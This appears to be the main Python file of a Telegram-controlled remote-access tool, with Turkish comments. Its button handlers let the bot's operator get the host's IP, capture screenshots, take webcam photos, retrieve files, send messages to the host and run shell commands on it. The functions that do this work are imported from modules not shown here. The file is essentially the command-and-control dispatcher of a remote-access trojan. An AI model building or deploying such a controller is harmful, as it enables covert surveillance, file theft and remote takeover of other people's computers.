from time import sleep
import telebot
from telebot import types
import os

#my library
from shell_cmd import handle_shell
from utils import delete_message_with_buttons, homepage
from list import handle_buttons
from ip import get_ip
from sendmsg import wait_for_photo
from sendmsg import wait_for_text
from send_ss import send_screen
from send_zip import wait_for_zip
from takephoto import take_photo


# Telegram botunuzun token'ı
TOKEN = ''

# Bot'u oluşturun
bot = telebot.TeleBot(TOKEN)

# Resimleri saklamak için bir klasör belirleyin
RESIM_KLASORU = "resimler"

# Eğer resim klasörü yoksa oluşturun
if not os.path.exists(RESIM_KLASORU):
    os.makedirs(RESIM_KLASORU)

# menü
def menu():
    markup = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
    markup.add(types.KeyboardButton("/start"))
    return markup

# /start komutunu işle
@bot.message_handler(commands=['start'])
def send_welcome(message):
    # Karşılama mesajını gönder
    # Ana sayfayı göster
    homepage(bot, message, "Başlamak için bir işlem seçin.")


# Butonlara basıldığında çalışacak işlev
@bot.callback_query_handler(func=lambda call: True)
def handle_buttons_wrapper(call):
    if call.data == 'ip':
        delete_message_with_buttons(bot, call.message.chat.id, call.message.message_id)
        # "IP" butonuna basıldığında yapılacak işlemler
        get_ip(bot, call)
    elif call.data == 'sendmsg':
        # "Send Message" butonuna basıldığında mesaj kutusu aç
        delete_message_with_buttons(bot, call.message.chat.id, call.message.message_id)
        msgpanel = types.InlineKeyboardMarkup(row_width=2)
        send_pic = types.InlineKeyboardButton("Resim", callback_data="img")
        send_text = types.InlineKeyboardButton("Text", callback_data="txt")
        msgpanel.add(send_pic)
        msgpanel.add(send_text)
        bot.send_message(call.message.chat.id, "İşlem türünü seçin.", reply_markup=msgpanel)
    elif call.data == 'ss':
        delete_message_with_buttons(bot, call.message.chat.id, call.message.message_id)
        # "Screenshot" butonuna basıldığında ekran görüntüsü al
        send_screen(bot, call.message)
    elif call.data == 'txt':
        delete_message_with_buttons(bot, call.message.chat.id, call.message.message_id)
        wait_for_text(bot, call.message)
    elif call.data == 'img':
        delete_message_with_buttons(bot, call.message.chat.id, call.message.message_id)
        wait_for_photo(bot, call.message)
    elif call.data == 'getfile':
        delete_message_with_buttons(bot, call.message.chat.id, call.message.message_id)
        # "Get File" butonuna basıldığında dosya alma işlemi başlat
        wait_for_zip(bot, call.message)
    elif call.data == 'shell':
        delete_message_with_buttons(bot, call.message.chat.id, call.message.message_id)
        # "Shell" butonuna basıldığında shell komutu alma işlemi başlat
        handle_shell(bot, call.message)
    elif call.data == 'takefoto':
        delete_message_with_buttons(bot, call.message.chat.id, call.message.message_id)
        # "Take Photo" butonuna basıldığında fotoğraf çekme işlemi başlat
        print("take photo")
        take_photo(bot, call.message)
    else:
        delete_message_with_buttons(bot, call.message.chat.id, call.message.message_id)
        handle_buttons(bot, call)

# Bot'u sürekli çalışacak şekilde döngüye alın
while True:
    try:
        # Bot'u başlat
        bot.polling()
    except Exception as e:
        # Hata durumunda hatayı görüntüle ve botu yeniden başlat
        print(f"Hata: {e}")
        continue
